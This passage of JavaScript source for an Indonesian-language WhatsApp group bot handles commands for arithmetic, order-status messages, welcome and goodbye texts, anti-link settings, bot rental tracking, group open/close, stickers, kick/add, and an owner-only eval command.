            if (!text.includes('-')) return m.reply(`Gunakan dengan cara ${command} *angka* - *angka*\n\n_Contoh_\n\n${command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
            var nilai_one = Number(atas)
            var nilai_two = Number(bawah)
            reply(`${nilai_one - nilai_two}`)}
            break
        case 'kali':{
            if (!text.includes('*')) return m.reply(`Gunakan dengan cara ${command} *angka* * *angka*\n\n_Contoh_\n\n${command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
            var nilai_one = Number(atas)
            var nilai_two = Number(bawah)
            reply(`${nilai_one * nilai_two}`)}
            break
        case 'bagi':{
            if (!text.includes('/')) return m.reply(`Gunakan dengan cara ${command} *angka* / *angka*\n\n_Contoh_\n\n${command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
            var nilai_one = Number(atas)
            var nilai_two = Number(bawah)
            reply(`${nilai_one / nilai_two}`)}
            break
		case 'setproses': case 'setp':{
		if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
            if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
            if (isSetProses((m.isGroup? m.chat: botNumber), set_proses)) return m.reply(`Set proses already active`)
            addSetProses(text, (m.isGroup? m.chat: botNumber), set_proses)
            reply(`✅ Done set proses!`)
		}
            break
        case 'changeproses': case 'changep':{
		if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
            if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
            if (isSetProses((m.isGroup? m.chat: botNumber), set_proses)) {
                changeSetProses(text, (m.isGroup? m.chat: botNumber), set_proses)
                m.reply(`Sukses ubah set proses!`)
            } else {
                addSetProses(text, (m.isGroup? m.chat: botNumber), set_proses)
                m.reply(`Sukses ubah set proses!`)
            }
        }
            break
        case 'delsetproses': case 'delsetp':{
		if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
            if (!isSetProses((m.isGroup? m.chat: botNumber), set_proses)) return m.reply(`Belum ada set proses di gc ini`)
            removeSetProses((m.isGroup? m.chat: botNumber), set_proses)
            reply(`Sukses delete set proses`)
        }
            break
		case 'setdone':{
		if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
			if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
            if (isSetDone((m.isGroup? m.chat: botNumber), set_done)) return m.reply(`Udh set done sebelumnya`)
            addSetDone(text, (m.isGroup? m.chat: botNumber), set_done)
            reply(`Sukses set done!`)
            break
            }
           case 'changedone': case 'changed':{
		if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
            if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
            if (isSetDone((m.isGroup? m.chat: botNumber), set_done)) {
                changeSetDone(text, (m.isGroup? m.chat: botNumber), set_done)
                m.reply(`Sukses ubah set done!`)
            } else {
                addSetDone(text, (m.isGroup? m.chat: botNumber), set_done)
                m.reply(`Sukses ubah set done!`)
            }
           }
            break
        case 'delsetdone': case 'delsetd':{
		if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
            if (!isSetDone((m.isGroup? m.chat: botNumber), set_done)) return m.reply(`Belum ada set done di gc ini`)
            removeSetDone((m.isGroup? m.chat: botNumber), set_done)
            m.reply(`Sukses delete set done`)
        }
            break
            case"p": case"proses":{
		if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
			if (!m.quoted) return m.reply('Reply pesanan yang akan proses')
            let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
            let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!`
            const getTextP = getTextSetProses((m.isGroup? m.chat: botNumber), set_proses);
            if (getTextP !== undefined) {
            	var anunya = (getTextP.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
                alpha.sendTextWithMentions(m.chat, anunya, m)
            } else {
   alpha.sendTextWithMentions(m.chat, (proses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)
            }
            }
            break
            case "d": case'done':{
		if (!(m.isGroup? isAdmins : isCreator)) return m.reply('Fitur Khusus admin!')
			if (!m.quoted) return m.reply('Reply pesanan yang telah di proses')
            let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
            let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @user Next Order ya🙏`            
            const getTextD = getTextSetDone((m.isGroup? m.chat: botNumber), set_done);
            if (getTextD !== undefined) {
            	var anunya = (getTextD.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
            	alpha.sendTextWithMentions(m.chat, anunya, m)
               } else {
               	alpha.sendTextWithMentions(m.chat, (sukses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)
               }
   }
   break
			case'welcome':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!isAdmins) return m.reply('Fitur Khusus admin!')
            if (args[0] === "on") {
               if (isWelcome) return m.reply(`Udah on`)
                _welcome.push(m.chat)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
                reply('Sukses mengaktifkan welcome di grup ini')
            } else if (args[0] === "off") {
               if (!isWelcome) return m.reply(`Udah off`)
                let anu = _welcome.indexOf(m.chat)
               _welcome.splice(anu, 1)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
                reply('Sukses menonaktifkan welcome di grup ini')
            } else {
                reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
			}
			}
            break
        case'left': case 'goodbye':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!isAdmins) return m.reply('Fitur Khusus admin!')
            if (args[0] === "on") {
               if (isLeft) return m.reply(`Udah on`)
                _left.push(m.chat)
                fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
                reply('Sukses mengaktifkan goodbye di grup ini')
            } else if (args[0] === "off") {
               if (!isLeft) return m.reply(`Udah off`)
                let anu = _left.indexOf(m.chat)
               _left.splice(anu, 1)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
                reply('Sukses menonaktifkan goodbye di grup ini')
            } else {
                reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
            }
        }
            break
        	case'setwelcome':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
            if (!text) return m.reply(`Gunakan dengan cara ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Halo @user, Selamat datang di @group`)
            if (isSetWelcome(m.chat, set_welcome_db)) return m.reply(`Set welcome already active`)
            addSetWelcome(text, m.chat, set_welcome_db)
           reply(`Successfully set welcome!`)
        	}
            break
        case'changewelcome':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
            if (!text) return m.reply(`Gunakan dengan cara ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Halo @user, Selamat datang di @group`)
            if (isSetWelcome(m.chat, set_welcome_db)) {
               changeSetWelcome(q, m.chat, set_welcome_db)
                reply(`Sukses change set welcome teks!`)
            } else {
              addSetWelcome(q, m.chat, set_welcome_db)
                reply(`Sukses change set welcome teks!`)
            }}
            break
        case'delsetwelcome':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
            if (!isSetWelcome(m.chat, set_welcome_db)) return m.reply(`Belum ada set welcome di sini..`)
            removeSetWelcome(m.chat, set_welcome_db)
           reply(`Sukses delete set welcome`)
        }
            break
        case'setleft':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
            if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
            if (isSetLeft(m.chat, set_left_db)) return m.reply(`Set left already active`)
           addSetLeft(q, m.chat, set_left_db)
            reply(`Successfully set left!`)
        }
            break
        case'changeleft':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
            if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
            if (isSetLeft(m.chat, set_left_db)) {
               changeSetLeft(q, m.chat, set_left_db)
                reply(`Sukses change set left teks!`)
            } else {
                addSetLeft(q, m.chat, set_left_db)
                reply(`Sukses change set left teks!`)
            }
        }
            break
        case'delsetleft':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!isCreator && !isAdmins) return m.reply('Fitur Khusus owner!')
            if (!isSetLeft(m.chat, set_left_db)) return m.reply(`Belum ada set left di sini..`)
            removeSetLeft(m.chat, set_left_db)
            reply(`Sukses delete set left`)
        }
            break
case'antiwame':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin terlebih dahulu")
             if (args[0] === "on") {
                if (isAntiWame) return m.reply(`Udah aktif`)
                antiwame.push(m.chat)
                fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
                reply('Successfully Activate Antiwame In This Group')
            } else if (args[0] === "off") {
                if (!isAntiWame) return m.reply(`Udah nonaktif`)
                let anu = antiwame.indexOf(m.chat)
                antiwame.splice(anu, 1)
                fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
                reply('Successfully Disabling Antiwame In This Group')
            } else {
                reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
            }
}
            break
case'antiwame2':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Jadikan bot sebagai admin terlebih dahulu")
             if (args[0] === "on") {
                if (isAntiWame2) return m.reply(`Udah aktif`)
                antiwame2.push(m.chat)
                fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
                reply('Successfully Activate antiwame2 In This Group')
            } else if (args[0] === "off") {
                if (!isAntiWame2) return m.reply(`Udah nonaktif`)
                let anu = antiwame2.indexOf(m.chat)
                antiwame2.splice(anu, 1)
                fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
                reply('Successfully Disabling antiwame2 In This Group')
            } else {
                reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
            }
}
            break
           case'addsewa':{
            if (!isCreator) return m.reply("Fitur khusus owner!")
            if (text < 2) return m.reply(`Gunakan dengan cara ${prefix + command} *linkgc waktu*\n\nContoh : ${command} https://chat.whatsapp.com/JanPql7MaMLa 30d\n\n*CATATAN:*\nd = hari (day)\nm = menit(minute)\ns = detik (second)\ny = tahun (year)\nh = jam (hour)`)
            if (!isUrl(args[0])) return m.reply("Link grup wa gk gitu modelnya cuy")
            var url = args[0]
            url = url.split('https://chat.whatsapp.com/')[1]
            if (!args[1]) return m.reply(`Waktunya?`)
            var data = await alpha.groupAcceptInvite(url)
            if(checkSewaGroup(data, sewa)) return m.reply(`Bot sudah disewa oleh grup tersebut!`)
            addSewaGroup(data, args[1], sewa)
            reply(`Success Add Sewa Group Berwaktu!`)
           }
            break
			case'delsewa':{
            if (!isCreator) return m.reply("Fitur khusus owner!")
            if (!m.isGroup) return m.reply(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
            if (!isSewa) return m.reply(`Bot tidak disewa di Grup ini`)
            sewa.splice(getSewaPosition(m.chat, sewa), 1)
            fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
            reply(`Sukses del sewa di grup ini`)
			}
            break
        case 'ceksewa': case 'listsewa':{
            let list_sewa_list = `*LIST SEWA*\n\n*Total:* ${sewa.length}\n\n`
            let data_array = [];
            for (let x of sewa) {
                list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
                if (x.expired === 'PERMANENT') {
                    let ceksewa = 'PERMANENT'
                    list_sewa_list += `*Expire :* PERMANENT\n\n`
                } else {
                    let ceksewa = x.expired - Date.now()
                    list_sewa_list += `*Expired :* ${msToDate(ceksewa)}\n\n`
                }
            }
            alpha.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })
        }
            break
			case'open': case'buka':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Bot bukan admin")
           alpha.groupSettingUpdate(m.chat, 'not_announcement')
            const textOpen = await getTextSetOpen(m.chat, set_open);
            reply(textOpen || `Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
			}
			break
case'antilink':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Bot harus menjadi admin")
            if (args[0] === "on") {
               if (isAntiLink) return m.reply(`Udah aktif`)
                antilink.push(m.chat)
                fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                reply('Successfully Activate Antilink In This Group')
            } else if (args[0] === "off") {
               if (!isAntiLink) return m.reply(`Udah nonaktif`)
                let anu = antilink.indexOf(m.chat)
                antilink.splice(anu, 1)
                fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                reply('Successfully Disabling Antilink In This Group')
            } else {
                reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
            }
  
}
            break
case'antilink2':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Bot harus menjadi admin")
            if (args[0] === "on") {
               if (isAntiLink2) return m.reply(`Udah aktif`)
                antilink2.push(m.chat)
                fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
                reply('Successfully Activate antilink2 In This Group')
            } else if (args[0] === "off") {
               if (!isAntiLink2) return m.reply(`Udah nonaktif`)
                let anu = antilink2.indexOf(m.chat)
                antilink2.splice(anu, 1)
                fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
                reply('Successfully Disabling antilink2 In This Group')
            } else {
                reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
            }
  
}
            break
case'close': case'tutup':{
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply("Bot bukan admin")
	    alpha.groupSettingUpdate(m.chat, 'announcement')
			const textClose = await getTextSetClose(m.chat, set_close);
		    reply(textClose || `Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
}
		    break
         case 'h':
         case 'hidetag':{
            if (!m.isGroup) return reply("Khusus grup")
            if (!(isAdmins || isCreator)) return reply("Fitur khusus admin")
   let tek = m.quoted ? quoted.text : (text ? text : "")
            alpha.sendMessage(m.chat, {
               text: tek ,
               mentions: participants.map(a => a.id)
            }, {
            })
         }
            break
         case 'sgif':
         case 'stikerin':
         case 's':
         case 'sticker':
         case 'stiker': {
           if (!quoted) return reply(`Reply foto/video dengan caption ${prefix + command}\n\ndurasi video maks 1-9 detik`)
            if (/image/.test(mime)) {
               let media = await quoted.download()
               let encmedia = await alpha.sendImageAsSticker(m.chat, media, m, {
                  packname: global.namabot,
                  author: global.namaowner
               })
               await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
               if ((quoted.msg || quoted).seconds > 11) return reply(`Reply foto/video dengan caption ${prefix + command}\n\ndurasi video maks 1-9 detik`)
               let media = await quoted.download()
               let encmedia = await alpha.sendVideoAsSticker(m.chat, media, m, {
                  packname: global.namabot,
                  author: global.namaowner
               })
               await fs.unlinkSync(encmedia)
            } else {
               reply(`Reply foto/video dengan caption ${prefix + command}\n\ndurasi video maks 1-9 detik`)
            }
 
         }
         break
			case 'kick': {
				if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply('Fitur Khusus admin!')
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alpha.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply('Sukses kick target✅')).catch((err) => m.reply('❌ Terjadi kesalahan'))
	}
	break
	case 'add': {
		if (!m.isGroup) return m.reply('Fitur Khusus Group!')
				if (!isAdmins) return m.reply('Fitur Khusus admin!')
                if (!isBotAdmins) return m.reply('Fitur Khusus admin!')
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alpha.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply('Sukses add member✅')).catch((err) => m.reply('❌ Terjadi kesalahan, mungkin nmr nya privat'))
	}
	break
case 'ping':{
  m.reply(runtime(process.uptime()))
}
break
            default:
if (budy.startsWith('>')) {
                    if (!isCreator) return
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(util.format(err))
                    }
                }
       }
        
    } catch (err) {
        m.reply(util.format(err))
    }
}